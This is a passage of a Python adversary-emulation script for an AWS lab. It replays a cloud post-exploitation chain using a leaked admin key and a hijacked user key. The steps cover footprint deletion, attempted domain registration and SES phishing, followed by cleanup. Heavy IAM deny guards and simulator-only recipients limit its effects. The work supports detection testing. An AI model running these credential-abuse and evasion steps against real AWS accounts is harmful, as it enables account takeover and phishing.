            op_delay(1, 2)
        except ClientError as e:
            print_err(f"ListAccessKeys DangerDev: {e}")

        try:
            lab_iam.delete_login_profile(UserName="DangerDev@protonmail.me")
            print_ok("DeleteLoginProfile: DangerDev@protonmail.me")
        except ClientError as e:
            if e.response["Error"]["Code"] == "NoSuchEntity":
                print_ok("DeleteLoginProfile: no profile existed")
            else:
                print_err(f"DeleteLoginProfile DangerDev: {e}")

        op_delay(1, 2)

        try:
            lab_iam.delete_user(UserName="DangerDev@protonmail.me")
            print_ok("DeleteUser: DangerDev@protonmail.me — footprint erased")
            creds.invalidate("dangerdev_session")
        except ClientError as e:
            print_err(f"DeleteUser DangerDev@protonmail.me: {e}")

    op_delay(2, 6)
    record(15, "T1070", [
        "iam:UpdateAccessKey(ses)", "iam:DeleteAccessKey(ses)", "iam:DeleteUser(ses)",
        "iam:DetachUserPolicy(DangerDev@protonmail.me) [via LAB_OPERATOR_KEY]",
        "iam:DeleteAccessKey(DangerDev@protonmail.me) [via LAB_OPERATOR_KEY]",
        "iam:DeleteLoginProfile(DangerDev@protonmail.me) [via LAB_OPERATOR_KEY]",
        "iam:DeleteUser(DangerDev@protonmail.me) [via LAB_OPERATOR_KEY]",
    ], "success")

    # Steps 16-17 run as alice.chen's hijacked key ONLY (never a fallback
    # session: lab-infra-admin / DangerDev@protonmail.me hold AdministratorAccess
    # and carry none of the deny guards).  If they raise (guard breach), the
    # hijacked alice.chen key is still removed before the exception propagates.
    try:
        step16_domain_acquisition(creds, account_id)
        step17_ses_phishing(creds, account_id, region)
    finally:
        _cleanup_alice_hijacked_key(creds)


# ═══════════════════════════════════════════════════════════════════════════════
# STEPS 16-17 — Real calls, IAM-bounded outcome
# (design: docs/DANGERDEV_SES_DOMAIN_SAFETY.md in the apt_pipeline repo)
#
# Every call below is a real AWS API call made with alice.chen's hijacked key.
# Calls whose real outcome would be harmful (buying/transferring a domain,
# leaving the SES sandbox, toggling account sending, mailing a real person)
# are refused by IAM, not by this script: infra/__main__.py attaches the
# customer-managed policy `dangerdev-alice-emulation-guard` to alice.chen with explicit
# Denies.  AWS still records each refused attempt in CloudTrail with
# errorCode=AccessDenied, which is the detection signal.
#
# Defence in depth, in order:
#   1. Hard-coded lab-only inputs, asserted before any call (_assert_lab_*).
#   2. Pre-flight interlock: iam:SimulatePrincipalPolicy (as lab-infra-admin)
#      must report `explicitDeny` for alice.chen before a guarded call is made;
#      otherwise the call is skipped (fail closed).  The pre-flight is a lab
#      safety check, not attacker tradecraft, so MANIFEST.py does not list it.
#   3. The IAM Deny itself.
#   4. Post-call verification: a guarded call that returns anything other
#      than AccessDenied raises GuardrailBreach.
# ═══════════════════════════════════════════════════════════════════════════════

class GuardrailBreach(RuntimeError):
    """A deny-guarded call was NOT refused by IAM.  Never swallowed."""


ALICE_USER_NAME = "alice.chen"
ROUTE53DOMAINS_REGION = "us-east-1"   # Route 53 Domains is a us-east-1-only API
SES_SIMULATOR_RECIPIENT = "success@simulator.amazonses.com"
_LAB_DOMAIN_RE = re.compile(r"^mayatrail-emu-[a-z0-9-]+\.com$")
_SIMULATOR_RE = re.compile(r"^[a-z0-9._+-]+@simulator\.amazonses\.com$")
_BRAND_TOKENS = ("paypal", "pay-pal", "paypa1", "amazon", "aws", "apple", "microsoft",
                 "google", "bank", "chase", "coinbase", "binance", "login", "secure", "verify")
_ACCESS_DENIED = ("AccessDenied", "AccessDeniedException")

# Obviously-fake registrant data; only ever sent on a call IAM refuses.
_LAB_CONTACT = {
    "FirstName": "MayaTrail",
    "LastName": "EmulationLab",
    "ContactType": "PERSON",
    "AddressLine1": "1 Emulation Lab Way",
    "City": "Seattle",
    "State": "WA",
    "CountryCode": "US",
    "ZipCode": "98101",
    "PhoneNumber": "+1.5555550100",
    "Email": "registrant@example.com",
}


def _assert_lab_domain(domain: str) -> None:
    if not _LAB_DOMAIN_RE.fullmatch(domain) or any(t in domain for t in _BRAND_TOKENS):
        raise GuardrailBreach(f"refusing non-lab domain name {domain!r}")


def _assert_lab_recipients(recipients: list[str]) -> None:
    if not recipients or not all(_SIMULATOR_RE.fullmatch(r) for r in recipients):
        raise GuardrailBreach(f"refusing non-simulator recipients {recipients!r}")


def _guard_preflight(creds: CredentialStore, account_id: str, action: str,
                     context: list[dict] | None = None) -> bool:
    """
    True only when IAM is confirmed to EXPLICITLY deny `action` for alice.chen.

    Fail closed: any doubt (no admin session, unknown account, simulate error,
    implicitDeny, allowed) returns False and the guarded call is skipped.
    """
    if not account_id or not creds.has("leaked_admin_session"):
        print_err(f"[GUARD] cannot pre-flight {action}: no account id / admin session -- skipping call")
        return False
    try:
        kwargs = {
            "PolicySourceArn": f"arn:aws:iam::{account_id}:user/{ALICE_USER_NAME}",
            "ActionNames": [action],
        }
        if context:
            kwargs["ContextEntries"] = context
        resp = creds.get("leaked_admin_session").client("iam").simulate_principal_policy(**kwargs)
        decision = resp["EvaluationResults"][0]["EvalDecision"]
    except (ClientError, KeyError, IndexError) as e:
        print_err(f"[GUARD] pre-flight SimulatePrincipalPolicy {action} failed ({e}) -- skipping call")
        return False
    if decision != "explicitDeny":
        print_err(f"[GUARD] {action} for alice.chen evaluates to {decision!r}, not explicitDeny "
                  "-- deny guard missing, skipping call")
        return False
    print_ok(f"[GUARD] pre-flight: {action} -> explicitDeny for alice.chen")
    return True


def _expect_denied(action: str, call) -> str:
    """
    Make a deny-guarded call.  AccessDenied is the expected success outcome.
    Anything else (success, or any other error, which means IAM let the
    request through to the service) raises GuardrailBreach.
    """
    try:
        call()
    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code in _ACCESS_DENIED:
            print_ok(f"{action} -> {code} [EXPECTED: deny-guarded; CloudTrail records the attempt "
                     "with errorCode=AccessDenied]")
            return f"{action} [ATTEMPT: AccessDenied by IAM deny guard]"
        raise GuardrailBreach(
            f"{action} reached the service (error {code}: {e}) -- the IAM deny guard did NOT "
            "refuse it.  Stop and fix the dangerdev-alice-emulation-guard policy."
        ) from e
    raise GuardrailBreach(
        f"{action} SUCCEEDED -- the IAM deny guard did NOT refuse it.  Investigate immediately."
    )


def _alice_session(creds: CredentialStore) -> boto3.Session | None:
    # Deliberately no fallback to the active session (boto_client() default).
    if creds.has("alice_hijacked_session"):
        return creds.get("alice_hijacked_session")
    return None


def step16_domain_acquisition(creds: CredentialStore, account_id: str) -> None:
    # ── Step 16 · T1583.001 — Domain acquisition (attempt-level emulation) ────
    # Real DangerDev registered four PayPal-mimicking domains with alice.chen's
    # hijacked key.  Here: real availability check + suggestions (read-only,
    # free) on a lab-marked, non-brand name, then a real RegisterDomain that the
    # IAM deny guard refuses (a registration is a non-refundable charge and a
    # real internet asset).  Route 53 Domains only exists in us-east-1, so the
    # client and the CloudTrail events are in us-east-1 whatever the lab region.
    print_step("Step 16 [T1583.001] Domain acquisition: CheckDomainAvailability + GetDomainSuggestions "
               "(real), RegisterDomain (real call, deny-guarded -> AccessDenied)")
    alice = _alice_session(creds)
    if alice is None:
        print_err("alice_hijacked_session unavailable -- skipping Step 16 (no fallback identity)")
        record(16, "T1583.001", [], "skipped_no_session")
        return

    domain = f"mayatrail-emu-{datetime.now(timezone.utc):%Y%m%d%H%M%S}-{random.randint(0, 0xFFFF):04x}.com"
    _assert_lab_domain(domain)
    r53d = alice.client("route53domains", region_name=ROUTE53DOMAINS_REGION)
    calls: list[str] = []

    try:
        resp = r53d.check_domain_availability(DomainName=domain)
        print_ok(f"CheckDomainAvailability {domain}: {resp.get('Availability')}")
        calls.append("route53domains:CheckDomainAvailability")
    except ClientError as e:
        print_err(f"CheckDomainAvailability: {e}")

    op_delay(1, 3)

    try:
        resp = r53d.get_domain_suggestions(DomainName=domain, SuggestionCount=5, OnlyAvailable=True)
        names = [s.get("DomainName") for s in resp.get("SuggestionsList", [])]
        print_ok(f"GetDomainSuggestions {domain}: {names}")
        calls.append("route53domains:GetDomainSuggestions")
    except ClientError as e:
        print_err(f"GetDomainSuggestions: {e}")

    op_delay(1, 3)

    outcome = "emulated_attempt"
    if _guard_preflight(creds, account_id, "route53domains:RegisterDomain"):
        calls.append(_expect_denied(
            "route53domains:RegisterDomain",
            lambda: r53d.register_domain(
                DomainName=domain,
                DurationInYears=1,
                AutoRenew=False,
                AdminContact=_LAB_CONTACT,
                RegistrantContact=_LAB_CONTACT,
                TechContact=_LAB_CONTACT,
                PrivacyProtectAdminContact=True,
                PrivacyProtectRegistrantContact=True,
                PrivacyProtectTechContact=True,
            ),
        ))
    else:
        outcome = "skipped_guard_unverified"
        calls.append("route53domains:RegisterDomain [SKIPPED: deny guard not confirmed]")

    op_delay(1, 3)
    record(16, "T1583.001", calls, outcome)


def step17_ses_phishing(creds: CredentialStore, account_id: str, region: str) -> None:
    # ── Step 17 · T1566.002 — SES spearphishing (attempt-level emulation) ─────
    # Real SES recon, a lab sender identity on an unverifiable example.com
    # address, and a real SendEmail to the SES mailbox simulator.  IAM only
    # lets alice.chen send to *@simulator.amazonses.com from the lab identity;
    # the identity can never verify, so SES answers MessageRejected.  Nobody
    # can ever be phished.  Leaving the sandbox (PutAccountDetails) and
    # toggling account sending (UpdateAccountSendingEnabled) are attempted and
    # refused by the IAM deny guard.
    #
    # NOTE: SendEmail is a CloudTrail DATA event (AWS::SES::EmailIdentity); it
    # is not in Event History or a default trail.  The lab's
    # dangerdev-ses-data-events trail captures it for the lab identity only.
    print_step("Step 17 [T1566.002] SES: recon, lab identity, SendEmail to mailbox simulator (real), "
               "PutAccountDetails / UpdateAccountSendingEnabled (real calls, deny-guarded)")
    alice = _alice_session(creds)
    if alice is None:
        print_err("alice_hijacked_session unavailable -- skipping Step 17 (no fallback identity)")
        record(17, "T1566.002", [], "skipped_no_session")
        return

    ses = alice.client("ses")
    sesv2 = alice.client("sesv2")
    calls: list[str] = []
    outcome = "emulated_attempt"

    # 17a — recon as the hijacked user
    try:
        quota = ses.get_send_quota()
        print_ok(f"GetSendQuota (alice.chen): Max24h={quota['Max24HourSend']}")
        calls.append("ses:GetSendQuota")
    except ClientError as e:
        print_err(f"GetSendQuota: {e}")
    try:
        acct = sesv2.get_account()
        print_ok(f"GetAccount (sesv2): ProductionAccessEnabled={acct.get('ProductionAccessEnabled')}, "
                 f"SendingEnabled={acct.get('SendingEnabled')}")
        calls.append("ses:GetAccount")
    except ClientError as e:
        print_err(f"GetAccount: {e}")
    try:
        ids = ses.list_identities(IdentityType="EmailAddress")
        print_ok(f"ListIdentities (EmailAddress): {ids['Identities']}")
        calls.append("ses:ListIdentities")
    except ClientError as e:
        print_err(f"ListIdentities: {e}")

    op_delay(1, 3)

    # 17b — lab sender identity (unverifiable: example.com receives no mail)
    try:
        ses.verify_email_identity(EmailAddress=SES_LAB_IDENTITY)
        print_ok(f"VerifyEmailIdentity: {SES_LAB_IDENTITY} (never verifies; removed by remediate_out_of_band)")
        calls.append("ses:VerifyEmailIdentity")
    except ClientError as e:
        print_err(f"VerifyEmailIdentity: {e}")

    op_delay(1, 3)

    # 17c — real SendEmail, mailbox simulator only
    recipients = [SES_SIMULATOR_RECIPIENT]
    _assert_lab_recipients(recipients)
    try:
        resp = ses.send_email(
            Source=SES_LAB_IDENTITY,
            Destination={"ToAddresses": recipients},
            Message={
                "Subject": {"Data": "[MAYATRAIL EMULATION] T1566.002 lure - simulator only"},
                "Body": {"Text": {"Data": (
                    "MayaTrail DANGERDEV emulation. Sent only to the SES mailbox simulator; "
                    "no human recipient. Lure link placeholder: https://example.com/"
                )}},
            },
        )
        print_ok(f"SendEmail -> {SES_SIMULATOR_RECIPIENT}: MessageId={resp['MessageId']} "
                 "(lab identity is verified; delivered to the SES mailbox simulator only)")
        calls.append("ses:SendEmail [SENT to mailbox simulator]")
        outcome = "emulated"
    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code == "MessageRejected":
            print_ok(f"SendEmail -> MessageRejected [EXPECTED: sender {SES_LAB_IDENTITY} is unverified]. "
                     "Real ses:SendEmail call made; CloudTrail data event only if the trail selects "
                     "AWS::SES::EmailIdentity data events")
            calls.append("ses:SendEmail [ATTEMPT: MessageRejected, unverified sender]")
        elif code in _ACCESS_DENIED:
            print_err(f"SendEmail -> {code}: the simulator-only Allow did not match -- check the "
                      "ses:Recipients / ses:FromAddress conditions in dangerdev-alice-emulation-guard")
            calls.append(f"ses:SendEmail [UNEXPECTED: {code}]")
            outcome = "emulated_attempt_unexpected_deny"
        else:
            print_err(f"SendEmail: {e}")
            calls.append(f"ses:SendEmail [ERROR: {code}]")

    op_delay(1, 3)

    # 17d — leave the sandbox (files a real AWS support case if it went through)
    if _guard_preflight(creds, account_id, "ses:PutAccountDetails"):
        calls.append(_expect_denied(
            "ses:PutAccountDetails",
            lambda: sesv2.put_account_details(
                MailType="MARKETING",
                WebsiteURL="https://example.com/",
                ContactLanguage="EN",
                UseCaseDescription="MayaTrail emulation lab - this request must be refused by IAM",
                ProductionAccessEnabled=True,
            ),
        ))
    else:
        outcome = "skipped_guard_unverified"
        calls.append("ses:PutAccountDetails [SKIPPED: deny guard not confirmed]")

    op_delay(1, 2)

    # 17e — account sending toggle.  Enabled=True so that even a hypothetical
    # guard failure is a no-op on an enabled account, never an outage.
    if _guard_preflight(creds, account_id, "ses:UpdateAccountSendingEnabled"):
        calls.append(_expect_denied(
            "ses:UpdateAccountSendingEnabled",
            lambda: ses.update_account_sending_enabled(Enabled=True),
        ))
    else:
        outcome = "skipped_guard_unverified"
        calls.append("ses:UpdateAccountSendingEnabled [SKIPPED: deny guard not confirmed]")

    op_delay(2, 5)
    record(17, "T1566.002", calls, outcome)


def _cleanup_alice_hijacked_key(creds: CredentialStore) -> None:
    # ── Post-17 lab cleanup — remove alice.chen's hijacked key ─────────────────
    # Prevent key accumulation across repeated emulation runs. Uses operator key
    # (same as Step 15 DangerDev cleanup) to delete the key created in Step 12.
    alice_hijacked_meta = creds.meta("alice_hijacked_session")
    alice_hijacked_key_id = alice_hijacked_meta.get("key_id")
    if alice_hijacked_key_id and creds.has("leaked_admin_session"):
        op_delay(1, 2)
        try:
            lab_cleanup_iam = creds.get("leaked_admin_session").client("iam")
            lab_cleanup_iam.delete_access_key(UserName="alice.chen", AccessKeyId=alice_hijacked_key_id)
            print_ok(f"Post-17 cleanup: DeleteAccessKey alice.chen/{alice_hijacked_key_id} — hijacked key removed")
            creds.invalidate("alice_hijacked_session")
        except ClientError as e:
            if e.response["Error"]["Code"] == "NoSuchEntity":
                print_ok(f"Post-17 cleanup: alice.chen/{alice_hijacked_key_id} already gone")
            else:
                print_err(f"Post-17 cleanup: DeleteAccessKey alice.chen: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
# SUMMARY
# ═══════════════════════════════════════════════════════════════════════════════

def print_summary():
    outcome_icon = {
        "success":            "[+]",
        "expected_failure_ok":"[+]",
        "userdata_only":      "[~]",
        "emulated":           "[+]",
        "emulated_attempt":   "[+]",
        "emulated_attempt_unexpected_deny": "[!]",
        "skipped_no_session": "[-]",
        "skipped_guard_unverified": "[-]",
    }
    print("\n" + "=" * 70)
    print("ATTACK CHAIN SUMMARY")
    print("=" * 70)
    for ev in _events:
        icon = outcome_icon.get(ev["outcome"], "[?]")
        calls = ev["api_calls"]
        calls_str = ", ".join(calls[:3]) + (f" (+{len(calls)-3} more)" if len(calls) > 3 else "")
        print(f"  {icon} Step {ev['step']:>2}  {ev['technique']:<13}  {ev['outcome']:<22}  {calls_str}")

    total_calls = sum(len(e["api_calls"]) for e in _events)
    executed = sum(1 for e in _events if e["outcome"] in (
        "success", "expected_failure_ok", "emulated", "emulated_attempt",
        "emulated_attempt_unexpected_deny",
    ))
    print(f"\n  Steps: {len(_events)}  |  Executed: {executed}  |  UserData/Skipped: {len(_events)-executed}"
          f"  |  API calls logged: {total_calls}")
    print("  Tactics: Initial Access, Discovery, Persistence, Privilege Escalation,")
    print("           Defense Evasion, Lateral Movement, Impact, Collection, Resource Development")
    print("\n  Out-of-band artifacts auto-remediated this run (remediate_out_of_band):")
    print(f"    - AdministratorAccess detached from {', '.join(BACKDOOR_ROLE_NAMES)}")
    print(f"    - SES lab identity {SES_LAB_IDENTITY} deleted")
    print("  Remaining teardown is `pulumi destroy` only — it removes all Pulumi-managed")
    print("  infra (VPC/EC2/S3/CloudTrail/GuardDuty/KMS), lab-infra-admin, the leaked key,")
    print("  and alice.chen.  No standing out-of-band resources are left behind.")


def remediate_out_of_band(outputs: dict, region: str) -> None:
    """
    Undo the IAM/SES mutations the attack makes OUTSIDE Pulumi's state so the
    stack can be fully torn down by `pulumi destroy` (and the TTL auto-destroy).

    The attack attaches AdministratorAccess to the two Pulumi-managed backdoor
    roles (Step 11, T1199) and verifies a lab SES identity (Step 17, T1566.002).
    AWS refuses to delete a role that still has an attached managed policy Pulumi
    does not manage, so without this remediation the backdoor roles — and
    therefore the whole stack — get stuck on destroy, leaving standing resources
    that keep accruing cost.

    Runs from run()'s finally, so it executes even if the chain aborted partway.
    It rebuilds the leaked lab-infra-admin session directly from the stack
    outputs (rather than reusing a CredentialStore entry that may not exist on an
    early failure), and every action is individually guarded and idempotent — a
    missing artifact is treated as already-clean and never blocks the others.

    Detection evidence is preserved: the CloudTrail / GuardDuty record of the
    attack remains intact; only the standing, cost-bearing resources are removed.

    Args:
        outputs: Pulumi stack outputs (must carry the leaked admin credential).
        region:  AWS region the stack was deployed in.
    """
    print_step("[CLEANUP] Remediating out-of-band artifacts so pulumi destroy can complete")

    leaked_key_id = outputs.get("admin_access_key_id")
    leaked_secret = outputs.get("admin_access_key_secret")
    if not leaked_key_id or not leaked_secret:
        print_err("[CLEANUP] leaked admin credential unavailable — cannot remediate; "
                  "pulumi destroy may fail on the backdoor roles")
        return

    session = make_session(leaked_key_id, leaked_secret, region)

    iam = session.client("iam")
    for role_name in BACKDOOR_ROLE_NAMES:
        try:
            iam.detach_role_policy(RoleName=role_name, PolicyArn=ADMINISTRATOR_ACCESS_ARN)
            print_ok(f"[CLEANUP] DetachRolePolicy AdministratorAccess <- {role_name}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("NoSuchEntity", "NoSuchEntityException"):
                print_ok(f"[CLEANUP] {role_name}: no AdministratorAccess attachment (already clean)")
            else:
                print_err(f"[CLEANUP] DetachRolePolicy {role_name}: {code}")

    try:
        ses = session.client("ses", region_name=region)
        ses.delete_identity(Identity=SES_LAB_IDENTITY)
        print_ok(f"[CLEANUP] DeleteIdentity {SES_LAB_IDENTITY}")
    except ClientError as e:
        print_err(f"[CLEANUP] DeleteIdentity {SES_LAB_IDENTITY}: {e.response['Error']['Code']}")


# ═══════════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Entry point called by the run_emulation_attack Celery task.

    Args:
        outputs: Pulumi stack outputs. Requires admin_access_key_id and
                 admin_access_key_secret (the leaked lab-infra-admin credential).
        region:  AWS region the stack was deployed in (Stack.region).
    """
    print("DangerDev — Automated Post-Exploitation Attack Script")
    print("MayaTrail Adversary Emulation  |  AWS  |  3 phases  |  17 steps")
    logger.info("DangerDev emulation starting (region=%s)", region)

    leaked_key_id = outputs.get("admin_access_key_id")
    leaked_secret = outputs.get("admin_access_key_secret")
    if not leaked_key_id or not leaked_secret:
        raise RuntimeError(
            "admin_access_key_id / admin_access_key_secret missing from stack "
            "outputs — cannot bootstrap the leaked-admin credential."
        )

    account_id = ""
    creds = CredentialStore()
    creds.add("leaked_admin_session", make_session(leaked_key_id, leaked_secret, region), {
        "key_id": leaked_key_id,
        "username": "lab-infra-admin",
    })
    creds.activate("leaked_admin_session")

    try:
        account_id = phase1(creds, account_id, region)
        phase2(creds, account_id, region)
        phase3(creds, account_id, region)
    except Exception as exc:
        print_err(f"Unhandled exception: {exc}")
        import traceback
        traceback.print_exc()
        raise
    finally:
        # Remove the attack's out-of-band IAM/SES artifacts so the stack tears
        # down cleanly via pulumi destroy and leaves no cost-bearing residue.
        remediate_out_of_band(outputs, region)
        print_summary()